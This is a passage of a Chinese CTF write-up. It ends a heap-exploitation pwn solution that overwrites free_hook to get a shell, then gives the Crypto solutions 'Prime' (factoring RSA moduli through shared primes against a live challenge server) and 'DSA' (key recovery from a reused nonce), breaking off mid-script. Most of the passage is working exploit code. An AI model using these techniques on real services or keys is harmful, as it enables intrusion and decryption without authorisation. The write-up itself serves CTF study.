<span class="n">comment</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">'a'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">throw</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
    <span class="n">base</span> <span class="o">=</span> <span class="n">libc</span><span class="o">-</span><span class="mh">0x1b27b0</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">base</span> <span class="o">=</span> <span class="n">libc</span><span class="o">-</span><span class="mh">0x1b07b0</span>

<span class="n">throw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s1">'c'</span><span class="o">*</span><span class="mi">20</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
<span class="n">throw</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xc</span><span class="p">,</span><span class="s1">'wwwww</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
<span class="n">comment</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">,</span><span class="mi">200</span><span class="p">)</span>

<span class="n">heap</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">throw</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mh">0x10</span><span class="p">:</span><span class="mh">0x14</span><span class="p">])</span><span class="o">-</span><span class="mh">0x48</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
    <span class="n">throw</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">'b</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">200</span><span class="p">)</span> <span class="c1">#0</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="c1">#1</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xfc</span><span class="p">,</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="c1">#2</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xfc</span><span class="p">,</span><span class="s1">'b</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">200</span><span class="p">)</span> <span class="c1">#3</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xfc</span><span class="p">,</span><span class="s1">'c</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">300</span><span class="p">)</span> <span class="c1">#4</span>

<span class="n">throw</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xfc</span><span class="p">,(</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xf1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x288</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x288</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x278</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">),</span><span class="mi">200</span><span class="p">)</span> <span class="c1">#2</span>
<span class="n">throw</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xec</span><span class="p">,</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="c1">#3</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xfc</span><span class="p">,</span><span class="s1">'b</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">200</span><span class="p">)</span> <span class="c1">#5</span>

<span class="n">throw</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x2c</span><span class="p">,</span><span class="s1">'qqqqqq</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="c1">#3</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xbc</span><span class="p">,</span><span class="s1">'a</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="c1">#6</span>

<span class="n">throw</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">throw</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="c1">#free_hook =  base + 0x1b38b0</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x1b18b0</span>


<span class="n">add</span><span class="p">(</span><span class="mh">0xfc</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="c1">#2</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x2c</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x298</span><span class="p">)</span><span class="o">+</span><span class="s1">'/bin/sh</span><span class="se">\0</span><span class="s1">'</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="c1">#3</span>


<span class="n">add</span><span class="p">(</span><span class="mh">0x2c</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x290</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x280</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="c1">#7</span>

<span class="n">sl</span><span class="p">(</span><span class="s1">'4'</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s1">'Give me an index: '</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="s1">'1'</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
<span class="n">se</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x290</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x288</span><span class="p">))</span>
<span class="n">ru</span><span class="p">(</span><span class="s1">'Wanna get more power?(y/n)'</span><span class="p">)</span>

<span class="n">sl</span><span class="p">(</span><span class="s1">'y'</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s1">'Give me serial:'</span><span class="p">)</span>
<span class="n">se</span><span class="p">(</span><span class="s1">'e4SyD1C!'</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
<span class="c1">#se('a'+p32(base+0x3ada0))</span>
<span class="n">se</span><span class="p">(</span><span class="s1">'a'</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="mh">0x3a940</span><span class="p">))</span>


<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h1 data-content="1" id="18892ebd1080817db9c3a6b6c42e9c7c">Crypto</h1>
<h2 data-content="1" id="303d16b8113f2b3c5959e04ccd828484">Prime</h2>
<p>题目给出4个N，不知道是咋生成的</p>
<p>瞎试，发现n0 n1不互质，后来发现任意两个都不互质，然后就能求出每个n的四个因子。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="kn">import</span> <span class="nn">decimal</span>
<span class="kn">import</span> <span class="nn">gmpy2</span>
<span class="k">def</span> <span class="nf">gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
   <span class="k">if</span> <span class="n">a</span> <span class="o">&lt;</span> <span class="n">b</span><span class="p">:</span>
     <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span>
   <span class="k">while</span> <span class="n">b</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
     <span class="n">temp</span> <span class="o">=</span> <span class="n">a</span> <span class="o">%</span> <span class="n">b</span>
     <span class="n">a</span> <span class="o">=</span> <span class="n">b</span>
     <span class="n">b</span> <span class="o">=</span> <span class="n">temp</span>
   <span class="k">return</span> <span class="n">a</span>

<span class="n">a</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">def</span> <span class="nf">oracle</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Please input your option:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"D"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Your encrypted message:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"The plain of your decrypted message is "</span><span class="p">)</span>
    <span class="n">lsb</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">lsb</span> <span class="o">==</span> <span class="s1">'odd'</span>

<span class="k">def</span> <span class="nf">partial</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
    <span class="n">k</span> <span class="o">=</span> <span class="n">n</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span>
    <span class="n">decimal</span><span class="o">.</span><span class="n">getcontext</span><span class="p">()</span><span class="o">.</span><span class="n">prec</span> <span class="o">=</span> <span class="n">k</span>  <span class="c1"># for 'precise enough' floats</span>
    <span class="n">lo</span> <span class="o">=</span> <span class="n">decimal</span><span class="o">.</span><span class="n">Decimal</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">hi</span> <span class="o">=</span> <span class="n">decimal</span><span class="o">.</span><span class="n">Decimal</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">oracle</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
            <span class="n">hi</span> <span class="o">=</span> <span class="p">(</span><span class="n">lo</span> <span class="o">+</span> <span class="n">hi</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">lo</span> <span class="o">=</span> <span class="p">(</span><span class="n">lo</span> <span class="o">+</span> <span class="n">hi</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
        <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">c</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span> <span class="o">%</span> <span class="n">n</span>
        <span class="k">print</span> <span class="n">i</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">hi</span> <span class="o">-</span> <span class="n">lo</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">hi</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="s2">"0123456789abcdefABCDEF"</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"47.111.59.243"</span><span class="p">,</span><span class="s2">"8003"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"[*] Please find a string that md5(str + "</span><span class="p">)</span>
<span class="n">salt</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"[0:5] == "</span><span class="p">)</span>
<span class="n">part_hash</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">found</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
                <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
                    <span class="n">ss</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="n">l</span><span class="o">+</span><span class="n">m</span>
                    <span class="k">if</span> <span class="n">md5</span><span class="p">(</span><span class="n">ss</span><span class="o">+</span><span class="n">salt</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="n">part_hash</span><span class="p">:</span>
                        <span class="n">found</span> <span class="o">=</span> <span class="mi">1</span>
                        <span class="k">break</span>
                <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
                    <span class="k">break</span>
            <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
        <span class="k">break</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ss</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"cs[0] = "</span><span class="p">)</span>
<span class="n">c1</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ns[0] = "</span><span class="p">)</span>
<span class="n">n1</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"cs[1] = "</span><span class="p">)</span>
<span class="n">c2</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ns[1] = "</span><span class="p">)</span>
<span class="n">n2</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"cs[2] = "</span><span class="p">)</span>
<span class="n">c3</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ns[2] = "</span><span class="p">)</span>
<span class="n">n3</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"cs[3] = "</span><span class="p">)</span>
<span class="n">c4</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ns[3] = "</span><span class="p">)</span>
<span class="n">n4</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>


<span class="n">n1p1</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span><span class="n">n2</span><span class="p">)</span>
<span class="n">n1p2</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span><span class="n">n3</span><span class="p">)</span>
<span class="n">n1p3</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span><span class="n">n4</span><span class="p">)</span>
<span class="n">n1p4</span> <span class="o">=</span> <span class="n">n1</span><span class="o">/</span><span class="p">(</span><span class="n">n1p1</span><span class="o">*</span><span class="n">n1p2</span><span class="o">*</span><span class="n">n1p3</span><span class="p">)</span>
<span class="n">d1</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">n1</span><span class="p">,(</span><span class="n">n1p1</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n1p2</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n1p3</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n1p4</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span>
<span class="n">m1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span><span class="n">d1</span><span class="p">,</span><span class="n">n1</span><span class="p">)</span>

<span class="n">n2p1</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n2</span><span class="p">,</span><span class="n">n1</span><span class="p">)</span>
<span class="n">n2p2</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n2</span><span class="p">,</span><span class="n">n3</span><span class="p">)</span>
<span class="n">n2p3</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n2</span><span class="p">,</span><span class="n">n4</span><span class="p">)</span>
<span class="n">n2p4</span> <span class="o">=</span> <span class="n">n2</span><span class="o">/</span><span class="p">(</span><span class="n">n2p1</span><span class="o">*</span><span class="n">n2p2</span><span class="o">*</span><span class="n">n2p3</span><span class="p">)</span>
<span class="n">d2</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">n2</span><span class="p">,(</span><span class="n">n2p1</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n2p2</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n2p3</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n2p4</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span>
<span class="n">m2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span><span class="n">d2</span><span class="p">,</span><span class="n">n2</span><span class="p">)</span>

<span class="n">n3p1</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n3</span><span class="p">,</span><span class="n">n1</span><span class="p">)</span>
<span class="n">n3p2</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n3</span><span class="p">,</span><span class="n">n2</span><span class="p">)</span>
<span class="n">n3p3</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n3</span><span class="p">,</span><span class="n">n4</span><span class="p">)</span>
<span class="n">n3p4</span> <span class="o">=</span> <span class="n">n3</span><span class="o">/</span><span class="p">(</span><span class="n">n3p1</span><span class="o">*</span><span class="n">n3p2</span><span class="o">*</span><span class="n">n3p3</span><span class="p">)</span>
<span class="n">d3</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">n3</span><span class="p">,(</span><span class="n">n3p1</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n3p2</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n3p3</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n3p4</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span>
<span class="n">m3</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c3</span><span class="p">,</span><span class="n">d3</span><span class="p">,</span><span class="n">n3</span><span class="p">)</span>

<span class="n">n4p1</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n4</span><span class="p">,</span><span class="n">n2</span><span class="p">)</span>
<span class="n">n4p2</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n4</span><span class="p">,</span><span class="n">n3</span><span class="p">)</span>
<span class="n">n4p3</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n4</span><span class="p">,</span><span class="n">n1</span><span class="p">)</span>
<span class="n">n4p4</span> <span class="o">=</span> <span class="n">n4</span><span class="o">/</span><span class="p">(</span><span class="n">n4p1</span><span class="o">*</span><span class="n">n4p2</span><span class="o">*</span><span class="n">n4p3</span><span class="p">)</span>
<span class="n">d4</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">n4</span><span class="p">,(</span><span class="n">n4p1</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n4p2</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n4p3</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">n4p4</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span>
<span class="n">m4</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c4</span><span class="p">,</span><span class="n">d4</span><span class="p">,</span><span class="n">n4</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ms[0] = "</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">m1</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ms[1] = "</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">m2</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ms[2] = "</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">m3</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ms[3] = "</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">m4</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</pre></div>
<h2 data-content="1" id="e45d04a961f465ae82805a1d6ff26f09">DSA</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819110748-864d63d8-c22e-1.png"/><br/>
脚本如下：</p>
<div class="highlight"><pre><span></span><span class="c1">#coding=utf8</span>
<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">DSA</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="kn">import</span> <span class="nn">gmpy2</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric.rsa</span> <span class="kn">import</span> <span class="n">_modinv</span>

<span class="n">p</span> <span class="o">=</span> <span class="mi">89884656743115795580686663829063433723705316331915518116995555215732107995059028542508401244839154951727540560161931978595376162965578570688594466436802284147607626105578924348149452183916543288346766737451989059750506942292767656446346135964708979885460659773076011464167414551120634816058711585048191954497</span>
<span class="n">q</span> <span class="o">=</span> <span class="mi">1111804377363103506497255080558092668997313464491</span>
<span class="n">g</span> <span class="o">=</span> <span class="mi">81015871603456981032885262867256289415428185718067221863176015480426278916784273932461088597278453025238130171264554340337052290801398971212149002598733514497274080038687844873045392142055341888546884513467006243654622193996237786587933291936305860861104505778330178660321910982065964185311229731036440300912</span>
<span class="n">y</span> <span class="o">=</span> <span class="mi">24205967076065946398939942966555243225474145978138314135133201932616151998778053968114291774217862261420967723355996662814191035892360634754604901035581578539634376520187757713469318847622699231634156440729178396025399617453913697005440949117064991219553520585024955478025227096450962672242862991836900979588</span>

<span class="c1">#找到一组同r的数据，m为字符串的md5</span>

<span class="c1"># And see the brave day sunk in hideous night</span>
<span class="c1"># Its MD5 digest: 189275664133327295485034625257633857845</span>
<span class="c1"># (1110285731834476772119910400331516120389395795749L, 671563422243860980520073471433161684440141852624L)</span>

<span class="c1"># ------------------------------------------------------------------------</span>

<span class="c1"># And sable curls all silver'd o'er with white</span>
<span class="c1"># Its MD5 digest: 76447611971473350019028042637993930502</span>
<span class="c1"># (1110285731834476772119910400331516120389395795749L, 218895397309026853341136197466419726836220239272L)</span>

<span class="n">s0</span><span class="o">=</span><span class="mi">671563422243860980520073471433161684440141852624</span>
<span class="n">s1</span><span class="o">=</span><span class="mi">218895397309026853341136197466419726836220239272</span>

<span class="n">m0</span><span class="o">=</span><span class="mi">189275664133327295485034625257633857845</span>
<span class="n">m1</span><span class="o">=</span><span class="mi">76447611971473350019028042637993930502</span>

<span class="n">r</span><span class="o">=</span> <span class="mi">1110285731834476772119910400331516120389395795749</span>

